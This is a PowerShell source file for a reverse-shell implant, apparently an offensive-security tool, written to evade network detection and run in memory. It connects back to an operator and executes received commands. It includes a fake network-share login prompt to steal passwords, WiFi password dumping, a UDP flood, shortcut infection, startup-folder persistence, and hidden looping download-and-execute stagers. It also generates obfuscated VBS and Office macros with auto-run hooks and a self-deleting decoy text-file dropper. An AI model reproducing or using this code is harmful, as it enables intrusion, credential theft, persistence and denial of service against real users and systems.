<#

b64-tcp-client, A base64 comm encoded variant of the TCP reverse shell and async-client 

Base code originally from Invoke-PowerShellTcp, written
by Nikhil "SamratAshok" Mittal ( GPLv3 ).

Contains most of the original TCP communications, but has been modified to use altered base64 encoding 
for data transfer. Also added most of the new functions from the async-client.

I created this to have a variant that only needs an open tcp socket [ ex: nc -lvvp 443 ] 
and can help evade network traffic signature detection.

It does NOT require the async-shell-handler C&C component.

It DOES require the b64-tcp-handler.pl to be able to 
communicate to this shell.

The code is self contained without one needing to pass any parameters, just the the web server ip hosting this script in the IEX.
Insure this file is only executed in memory via iex to decrease the likelihood of detection.

xor-function

#>


function start-tcpClient
{

      ##################[ CONFIG CONNECTION ]####################

	       #[->] Enter the ip address and port information here

	       $IPAddress = '192.168.0.15' 	# [->] Change this example
	       $Port = '8080'		            # [->] Change this example 

      ###########################################################


# encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
function base64string-encode {

	param($string)

	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

	return $encstring
}

function base64string-decode {

	param($encstring)

	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

	return $decstring
}

function b64Sub {

	param($rawstring)

	# Striping unsafe characters from url, also escaping the plus sign, creplace is case sensitive
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($rawstring))
	$rmequal = $encstring -replace '=', '!'
	$rmslash = $rmequal -replace '/', '_'
	$rmplus  = $rmslash -replace '\+', '-'

	$encData = $rmplus

	return $encData
}

function b64Desub {

	param($rawstring)

	# Striping unsafe characters from url, also escaping the plus sign, creplace is case sensitive
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($rawstring))
	$rmex = $encstring -replace '!', '='
	$rmun = $rmex -replace '_', '/'
	$rmsub  = $rmun -replace '-', '\+'
	
	$encData = $rmsub

	return $encData
}


function gen-key {

	$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
	1..70 | % { $rchr += $charArray | get-random }
	$randkey = [string]::join("", ($rchr))

	return $randkey

}


function show-help {

	$helpSummary = @"

get-info
	Displays a summary of current host

exec-script "name-of-script"
	Executes script hosted server side in /var/async-shell/ps-scripts by 
	IEX requires the name of the script filename as a parameter.

	[!] NOT Avaliable for TCP client shell version! 

obfuscate "name of text file / script"
	Uses a polyalphabetic obfuscation method on base64 strings writes 
	obfuscated string to file and provides a de-obfuscation key.

de-obfuscate "(name of text file / script), (key)"
	Performs the inverse of the obfuscation function requires the text 
	file with the obfuscated base64 data and de-obfuscation key as parameters.

gen-key
	generates a random alphabetic string for use with the obfuscate-base64 function.

obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)" 
	The function that contains the obfuscation engine, it works only with clear base64 data.

byte-encode ( binary-to-obfuscate, key )
	Performs byte-encoding prior to converting to obfuscated base64 provide 
	key de-obfuscation.

byte-decode ( file-containing-obfu-base64, key )
	performs the reverse of byte-encode, requires the de-obfuscation key.

askfor-creds
	Performs some social engineering in order to aquire plain-text credentials. 
	This is done by generating a authentication popup which seems to 
	reconnect to a network share.
	
dump-wificreds
	Dumps plain text passwords from wireless network profiles.
	For this to work code must be executed as an administrator.

shortcut-inject "name-of-lnk" "Url-hosting-script"
	Modifies the specified shortcut to run the original program and also execute a 
	download and execute command string. 
	
	Example: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
	
	Requires the http:// or https:// in the URL.
	
gen-enccmd "your command string"
	Generates a PowerShell formatted encoded command. Insure to quote your command string.
	
	example: gen-enccmd "cmd /c ipconfig /all"

dec-enccmd [Your encoded command string ] 
	Decodes the base64 string and displays the original string.


"@

	return $helpSummary
	
}


function get-info {

	$domain = $env:UserDomain
	$LogOnServer = $env:LogOnServer
	$userName = $env:UserName
	$machineName = $env:ComputerName

	$OS = (gwmi Win32_OperatingSystem).caption
	$SysDescription = (gwmi Win32_OperatingSystem).description
	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
	$PsVersion = $PSVersionTable.PSVersion.Major

	# Create table of AV software
	$avServices = @{"symantec" = "Symantec"; 
			"navapsvc" = "Norton";
			"mcshield" = "McAfee"; 
			"windefend" = "Windows Defender";
			"savservice" = "Sophos";
			"avp" = "Kaspersky";
			"SBAMSvc" = "Vipre";
			"avast!" = "Avast";
			"fsma" = "F-Secure";
			"antivirservice" = "AntiVir";
			"avguard" = "Avira";
			"fpavserver" = "F-Protect";
			"pshost" = "Panda Security";
			"pavsrv" = "Panda AntiVirus";
			"bdss" = "BitDefender";
			"avkproxy" = "G_Data AntiVirus";
			"klblmain" = "Kaspersky Lab AntiVirus";
			"vbservprof" = "Symantec VirusBlast";
			"ekrn" = "ESET";
			"abmainsv" = "ArcaBit/ArcaVir";
			"ikarus-guardx" = "IKARUS";
			"clamav" = "ClamAV";
			"aveservice" = "Avast";
			"immunetprotect" = "Immunet";
			"msmpsvc" = "Microsoft Security Essentials";
			"msmpeng" = "Microsoft Security Essentials";
	}
	
	#[->] generate summary of client
	$summary  = "============[ System Summary ]==============`n"
	$summary += "Domain       : $domain`n"
	$summary += "LogOn Server : $LogOnServer`n"
	$summary += "User Name    : $userName`n"
	$summary += "ComputerName : $machineName`n"
	$summary += "Admin        : $IsAdmin`n"
	$summary += "PS version   : $PsVersion`n"
	$summary += "OS version   : $OS`n"
	$summary += "Description  : $SysDescription`n"
	$summary += "======[ Detected Antivirus Services ]=======`n"

	#[->] get current services
	$services = (gwmi win32_service).name

	foreach ($S in $avServices.GetEnumerator()) {
		if ( $services -match $($S.Name) ) { $summary += "$($S.Name): $($S.Value)`n" }
	}

	return $summary

}


#[->] byte encoding decoding are for dealing with binary obfuscation
function byte-encode {

	param($binaryPath)

	$test = Test-Path $binaryPath -IsValid

	if ($test -eq $True)
	{

		$binBytes = get-content -Path $binaryPath -Encoding Byte
		$binb64String = [System.Convert]::ToBase64String($binBytes)

		$key = gen-key

		$obfuscated = obfuscate-base64 hide $key $binb64String
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $key `n"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		return $report

	}


}


#[->] recovers binaries encoded in obfuscated base64 strings  
function byte-decode( $b64file, $key ) {

	if ($key) {

		$test = Test-Path $b64file -IsValid

		if ($test -eq $True)
		{

			$obfb64string = get-content $b64file | Out-String
			$deobfuscated = obfuscate-base64 clear $key $obfb64string

			$bytes = [System.Convert]::FromBase64String($deobfuscated)
			set-content -Path .\change-extension -Value $bytes -Encoding Byte
			
			return "[!] created new binary change the extension manually!"

		}

	} else { return "[!] Failed! : The required key was not provided." }

}

function dump-wificreds {

	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
	if ($IsAdmin) 
	{ 

		$rawp = (netsh wlan show profiles) | where { $_  -match "All User Profile" }
		$profileData = "`n"		
		foreach ( $a in $rawp) 
		{ 

			$profile = $a.split(':')[1].trim()
			$pdata = (netsh wlan show profiles name=$profile key=clear) | where { $_ -match "Key Content" }
	
			if ($pdata) 
			{ 
				$password = $pdata.split(':')[1].trim()
				$profileData += "[+] Network: [ $profile ] || Pass: [ $password ] `n"
			}
		
		}
		
		return $profileData

	} else {  $notAdmin = "`n[!] You have to run this function as Admin to get plain text creds! `n"; return $notAdmin }

}

#[->] thx Mubix for the idea ;)
function askfor-creds {

	[int]$cnt = 1
	
	while ( $cnt -lt '4' ) {

		$user    = [Environment]::UserName
		$domain  = [Environment]::UserDomainName	

		$credentials = $Host.UI.PromptForCredential('Reconnect to Network Share','',$user,[Environment]::UserDomainName)
		$pass = $credentials.getnetworkcredential().password

		if ((gwmi win32_computersystem).partofdomain -eq $true ) {

			Add-Type -assemblyname system.DirectoryServices.AccountManagement
			$cntxtdom = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
			$chkdom = $cntxtdom.ValidateCredentials($user,$pass)

			if ( $chkdom -eq $false ) {
			
				Add-Type -AssemblyName System.Windows.Forms
				$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed, please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
			
			} else { break }
			
		} else {

			Add-Type -assemblyname system.DirectoryServices.AccountManagement 
			$localMachine = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
			$credtest = $localMachine.ValidateCredentials($user,$pass)

			if ( $credtest -eq $false ) { 
			
				Add-Type -assemblyname System.Windows.Forms
				$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
			
			} else { break }

		}

		$cnt++

	}
	
	if ( $cnt -eq '4' ) {

		$summary = "[!] Attempt failed! Exceeded login attempts."

	} else {

		$summary = "[!] Successfully authenticated with domain! `n"
		$summary += '[>] Domain\UserName: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass

	}
	
	return $summary

}

function launch-udpFlood {

	[CmdletBinding()] Param(
	
	[Parameter(Position=0)]
	[String]$targetIP

	)

	## Check IP variable
	
	if ($targetIP) {
	
		# launch udp flood on range of ports
		foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }

	} else { write-output "[!] target IP not specified, required!" }
	
}

function udpEngine {

	[CmdletBinding()] Param(
	
	[Parameter(Position=0, Mandatory = $true)]
	[String]$tIP,
	
	[Parameter(Position=1, Mandatory = $true)]
	[String]$prt
	
	)
	
	$address = [system.net.IPAddress]::Parse( $tIP )  

	# Create IP Endpoint   
	$end = New-Object System.Net.IPEndPoint $address , $prt 

	# Create Socket   
	$Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
	$Stype    = [System.Net.Sockets.SocketType]::Dgram  
	$Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
	$Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype   
	$Sock.TTL = 26
  
  
	while ($true) {
  
		# Connect to socket   
		$sock.Connect( $end )  

		# Create encoded buffer insert loop here that get data from the generated file
		$Enc = [System.Text.Encoding]::ASCII
		$Message = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890" * 700
		$Buffer  = $Enc.GetBytes( $Message )  

		# Send the buffer   
		$Sent   = $Sock.Send( $Buffer )  
	}

}


function gen-enccmd {

	param($clrcmd)

	$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString()) 
	$enccmd = [Convert]::ToBase64String($bytescmd) 

	return $enccmd
}

#[->] decodes a powershell formatted encoded command
function dec-enccmd {

	param($enccmd)

	$cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd))

	return $cmdString
}

#[->] pass a sentence as a string so it can be spoken by the system
function say-this {

	param($s)

	if ($s) {

		$voice = new-object -com SAPI.SpVoice
		$voice.speak("$s")

	} else { write-output "[!] you need to specifiy what you want said in quotes. Ex say-sentece < your sentence >" }

}

#[->] Kicks off a looping powershell command string 
function persistent-stager($scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
        {

		#[->] prep command download string to be passed to obfuscation engine
		$cmds = 'while(1){try{ powershell -w hidden -c '
		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
		$encCmdString = gen-enccmd $cmds
		$cmdstring = 'cmd /q /c powershell.exe -w hidden -enc ' + $encCmdString
	
		return $cmdstring

         } else {

                 write-output "[!] FAilED!`n[!]You need to use a proper URL"
                 write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
         }

}

#[->] function for variable name randomization
function rand-str {

        $rint = get-random -max 10 -min 3
        $charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        1..$rint | % { $rchr += $charArray | get-random }
        $randstr = [string]::join("", ($rchr))

        return $randstr
}

# [->] vbs code generator, the obfuscation engine core algo
function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {

	$newline = "`r`n"
	
    	#[->] Obfuscate command string for wscript shell
    	$cmdstrArray = @()
    	[int]$ccnt = '1'
	$cmdfile = $newline	
	
    	foreach ( $char in $cmdstring.GetEnumerator() ) 
	{
		
		#[->] translate to ascii value then do math ops on it
        	$val = [Byte][Char]$char
        	$rnum = get-random -max 9 -min 1
        	$nval = [int]$val - [int]$rnum
        	$hval = [int]$nval / '2'
		
		if ( [int]$ccnt -eq '1' )
		{

			#[->] genrate random variable name then append it to array
			$rvarstr = rand-str
			$rvarstr += rand-str
			$cmdstrArray += $rvarstr
			$cmdfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
			
		} else {
		
			$cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
		
		}
		
		#[->] create random legnth of char use
		$randval = get-random -max 12 -min 1
        	if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
       		$ccnt++	

	}
	
    	#[->] concatinate vars to single command string

    	[int]$cnt = 1
    	foreach ( $randvar in $cmdstrArray )
	{
		
		if ( $cnt -eq '1' )
        	{
        		$mainRvar = rand-str
        		$cmdfile += $newline
            		$cmdfile += $mainRvar + ' = ' + $randvar

        	} else { $cmdfile += ' + ' + $randvar }
       		$cnt++

	}

	
	if ( $sType -eq 'vbs' ) 
	{

        	#[->] set variables for template generation
        	$vbsCode = $newline

        	#[->] initialize first function in vbs script
        	$randfunc = rand-str
        	$vbsCode += 'Function ' + $randfunc + '() ' + $newline

        	#[->] Insert obfuscated command string.
        	$vbsCode += $cmdfile

        	#[->] initalize file system object
        	$fso = rand-str
        	$vbsCode += $newline
        	$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
        	$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
        	$vbsCode += 'End Function' + $newline
        	$vbsCode += $randfunc
			
        	#[->] vbs script in "vbsCode" is ready to be written to disk

		return $vbsCode
		
	}

	if ( $sType -eq 'vba' ) 
	{

		#[->] set variables for template generation
        	$newline = "`r`n"
        	$vbaCode = $newline

        	#[->] initialize first function in vbs script
        	$randfunc = rand-str
        	$vbaCode += 'Sub ' + $randfunc + '() ' + $newline

		#[->] Insert obfuscated command string.
        	$vbaCode += $cmdfile

		#[->] initalize file system object
        	$fso = rand-str
        	$vbaCode += $newline
		$vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
        	$vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
        	$vbaCode += 'End Sub' + $newline

      		#[->] Set different syntax based upon macro type word vs execl
        	if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
        	if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }

		#[->] vba script is ready

        	return $vbaCode

    	}

} # end obfuscate-cmdstring

#[->] requires the name of the shortcut along with a url hosting your PS script
#[->] example: shortcut-Infect "Chrome.lnk" "https://your-domain.com/ps-script"
function shortcut-infect($shortcutFullname, $scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
	{ 

                #[->] suppress error messages, makes debugging less annoying
                #[->] uncomment the code inside catch for more uniform error msg
		try { 

			$f = Get-Item $shortcutFullName -erroraction 'silentlycontinue'
                	$fh = $f.OpenWrite()

		} catch { 
			
			$msg = "[!] cannot write to file!"
			return $msg
                        #Write-Warning "Something went wrong!"
                        #Write-Error $_

		}

		if($fh){ $fh.Close() } else { return }
	
		write-output "[*] Infecting shortcut...."

		#[->] extracting original properties from selected icon
		$wsh = New-Object -COM WScript.Shell
		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath

		$chklnk = 'C:\\windows\\system32\\cmd.exe /c'
		if ( $targetPath -match $chklnk ) { $msg = "[!] This lnk is already done"; return $msg } 

		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
	
		#[->] Get name of binary without full path to use as icon target
		$targetBinary = (gci $targetPath -force).Name

		#[->] prep command download string to be passed to obfuscation engine
		$cmdstring = persistent-stager $scriptUrl
		
		#[->] Obfuscate first wscript command string
		$vbsfile = obfuscate-cmdstring $cmdstring 'vbs'
		
            	$newline = "`r`n"
		$vbsfile += $newline
	
		#[->] initialize second function 
		$randfunc2 = rand-str
		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
		$fso2 = rand-str
		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
		$vbsfile += 'End Function' + $newline
		$vbsfile += $randfunc2
	
		#[->] vbs script in "vbsfile" is ready to be written to disk
		#[->] create vbs script then change attribute to hidden
		$saveDir = (gci $shortcutFullname).DirectoryName + '\'
	
		$rand = rand-str; $vbsName = $rand + '.vbs'
		$vbspath = $saveDir + $vbsName
	
		set-content $vbspath $vbsfile -Encoding ASCII
		$vbsAtt = get-item $vbspath
		$vbsAtt.attributes="Hidden"
	
		#[->] Delete original shortcut 
		Remove-Item $shortcutFullname
	
		#[->] Modify values acquired from original shortcut 
		$wsh2 = New-Object -COM WScript.Shell
		$newSc = $shortcutFullname
		$newShortcut = $wsh2.CreateShortcut("$newSc")
		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
		$newShortcut.WorkingDirectory = $workingDir

		#[->] Set shortcut arguments	
		$args = '/c ' + '"' + $vbspath + '"'
		$newShortcut.Arguments = "$args"
		$newIcon = $targetPath + ',0'
		$newShortcut.IconLocation = "$newIcon"
		$newShortcut.Save();

		$msg = "[+] finished injecting command string into shortcut."
		return $msg

	} else { $msg = "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script"; return $msg }

}

#[->] Has a .lnk kick off a looping powershell string.
function gen-shortcut($scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
	{

		#[->] prep command download string to be passed to obfuscation engine
		$cmds = 'while(1){try{ powershell -noni -w hidden -exec bypass -c '
		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
		$encCmdString = gen-enccmd $cmds
		$argstring = '/q /c powershell.exe -noni -nop -w hidden -exec bypass -enc ' + $encCmdString


		#[->] use obfuscated 
		$WshShell = New-Object -comObject WScript.Shell
		$shortcut = $WshShell.CreateShortcut(".\downloader.lnk")
		$shortcut.TargetPath = "%comspec%"
		$shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,1"
		$Shortcut.Arguments = "$argstring" 
		$Shortcut.Save()
		
		write-output "[+] Genrated lnk file to current working directory."

	} else {
	
		write-output "[!] Failed!`n[!]You need to use a proper URL"
        	write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
	}


}

function simple-persistence($scriptUrl) {

	if ($scriptUrl) 
	{ 
	
		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
		{ 
		
			#[->] insure cmd string is working or not before intensive debugging
			$cmdstring = persistent-stager $scriptUrl
		
			#[->] create vbs script then change attribute to hidden
			$saveDir = $env:appdata + '\Microsoft\Windows\start menu\programs\Startup\'
			
			#[->] insure cmd string is working or not before intensive debugging
			$vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
			$rand = rand-str; $vbsName = $rand + '.vbs'
			$vbspath = $saveDir + $vbsName
	
			set-content $vbspath $vbsCode -Encoding ASCII
			write-output "[+] finished generating obfuscated persistent stager."
			
		} else { 
			
			write-output "[!] FAilED!`n[!]You need to use a proper URL" 
			write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script" 
		}
		
	} else { 
		
		$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-persistence "https://your-domain.com/ps-script"' + "`n"
		$usage += '[=>] drops an obfuscated vbs script to the windows startup folder.' + "`n"
		$usage += '[=>] Insure that the script is self contained and does not need additional parameters' + "`n"
		$usage += '[=>] for the C2 ip/port etc...' + "`n"
		
		write-output $usage
		
	}

}

function simple-downloader($scriptUrl) {

        if ($scriptUrl)
        {

                if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
                {

                        #[->] insure cmd string is working or not before intensive debugging
                        $cmdstring = persistent-stager $scriptUrl

                        #[->] create vbs script then change attribute to hidden
                        $saveDir = $pwd.Path + '\'

                        #[->] insure cmd string is working or not before intensive debugging
                        $vbsCode = obfuscate-cmdstring $cmdstring 'vbs'

                        $rand = rand-str
                        $vbsName = 'contact-' + $rand + '.txt.vbs'
                        $noteName = 'contact-' + $rand + '.txt'
                        $notePath = $saveDir + $noteName
                        $vbspath = $saveDir + $vbsName

                        #[->] cmd string to generate txt file
                        $NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName
                        $vbsCode += "`r`n"
                        $vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'

                        #[->] get vbs code to self-destruct
                        $randFso = rand-str
                        $vbsCode += "`r`n"
                        $vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
                        $vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'

                        set-content $vbspath $vbsCode -Encoding ASCII
                        write-output "[+] finished generating obfuscated persistent stager."

                } else {

                        write-output "[!] FAilED!`n[!]You need to use a proper URL"
                        write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
                }

        } else {

                $usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
                $usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
                $usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
                $usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"

                write-output $usage

        }

}

# action = hide or clear
# key = encrpytion or decryption string
# string = base64 string to either be encrypted or decrypted

function obfuscate-base64 {

        [CmdletBinding()] Param(

        [Parameter(Position=0, Mandatory = $true)]
        [String]
        $action,

        [Parameter(Position=1, Mandatory = $true)]
        [String]
        $key,

        [Parameter(Position=2, Mandatory = $true)]
        [String]
        $string


        )


	$alpha = @{ "1" = "A";
		"2" = "B";
		"3" = "C";
		"4" = "D";
		"5" = "E";
		"6" = "F";
		"7" = "G";
		"8" = "H";
		"9" = "I";
		"10" = "J";
		"11" = "K";
		"12" = "L";
		"13" = "M";
		"14" = "N";
		"15" = "O";
		"16" = "P";
		"17" = "Q";
		"18" = "R";
		"19" = "S";
		"20" = "T";
		"21" = "U";
		"22" = "V";
		"23" = "W";
		"24" = "X";
		"25" = "Y";
		"26" = "Z"; 
	}

	$inv_alpha = @{}

	#[->] create another hash table like alpha but with inverted values
	foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}

	$count = 0
	foreach ($ch in $string.GetEnumerator()) 
	{

		$c = [string]$ch
		if ( $c -match '[a-zA-Z]') 
		{

			$ival = $inv_alpha[$c]
			$s = $key[$count]

			if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining

				#[->] juggling variable formats between integer and string methods
				$ss = [string]$s
				$S = $ss.ToUpper()
				$shift = $inv_alpha[$S]

				if ($action -match 'hide' ) 
				 { $val = [int]$ival + [int]$shift } 
				 else { $val = [int]$ival - [int]$shift } 

				if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
				if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }

				#[->] juggling variable formats between integer and string methods
				$sval = [string]$val
				$char = $alpha[$sval]
				$schar = [string]$char

				if ( $c -cmatch '[a-z]' )
					  { $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) }
				elseif ( $c -cmatch '[A-Z]' )
					  { $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) }

				$count++

			} else { $ncipher += [string]::join("", ($c)) }

	}

	$scipher = [string]$ncipher
	return $scipher

}


#[->] requires file name and file path if not in the same running directory
function obfuscate {

	param($filePath)

	$test = Test-Path $filePath -IsValid

	if ($test -eq $True)
	{

		$fileBytes = get-content -Path $filePath -Encoding Byte
		$base64String = [System.Convert]::ToBase64String($fileBytes)

		$nKey = gen-key
		$action = 'hide'

		$obfuscated = obfuscate-base64 ( $action, $nkey, $base64String )
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $nKey"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		return $report

	} else { $report = "[!] File path is not valid!"; return $report }

}


function de-obfuscate ( $filePath, $key ) {

	if ($key)
	{

		$test = Test-Path $filePath -IsValid
		if ($test -eq $True)
		{

			$fileString = get-content $filePath | Out-String
                	$action = 'clear'

			$obfuscated = obfuscate-base64 ( $action, $key, $fileString )
			$obfuscated > 'New-File.txt'

			$report = "[!] Key generated is : $nKey"
			$report += "[!] wrote obfuscated data to New-File.txt!"

			return $report

		} else { $report = "[!] File path is not valid!"; return $report }


	} else { $report = "[!] You need to provide a de-obfuscation key!"; return $report } 

}



try
  {
	# Connect back if the reverse switch is used.
	$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

	 $stream = $client.GetStream()
	[byte[]]$bytes = 0..65535|%{0}

	#[->]Send back general info
	$profile = ( Invoke-Expression -Command get-info 2>&1 | Out-String )
	$prompt = "RSH => " + (Get-Location).Path + '> '
	$initPrompt = "Windows PowerShell: Copyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n" + "$profile" + "`n" + "$prompt"

	#[->] B64 encode info before transport
	$encPrompt = base64string-encode $initPrompt

	$encSubPrompt = b64Sub $encPrompt

	$sendbytes = ([text.encoding]::ASCII).GetBytes($encSubPrompt)
	$stream.Write($sendbytes,0,$sendbytes.Length)

	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
	{

		$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
		$Rb64Subdata = $EncodedText.GetString($bytes,0, $i)

		#[->] de-obfuscate base64 data
		$Rb64Encdata = b64Desub $Rb64Subdata

		#[->] Decode base64 commands
		$data = base64string-decode $Rb64Encdata

		try
		{
			#Execute the command on the target.
			$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
		}
		catch
		{
			Write-Warning "Something went wrong with execution of command on the target." 
			Write-Error $_
		}

		$sendback2 = $sendback + "RSH => " + (Get-Location).Path + '> '
		$x = ($error[0] | Out-String)
		$error.clear()
		$sendback3 = $sendback2 + $x

		#[->] Base64 encode the results
		$b64Result = base64string-encode $sendback3

		$subb64Result = b64Sub $b64Result

		#Return the results
		$sendbyte = ([text.encoding]::ASCII).GetBytes($subb64Result)
		$stream.Write($sendbyte,0,$sendbyte.Length)
		$stream.Flush()
	}

	$client.Close()
	if ($listener) {
		$listener.Stop()
	}
  }
catch
  {
	Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
 	$x = ($error[0] | Out-String)
	Write-Output $x
	Write-Error $_
  }


}

start-tcpClient
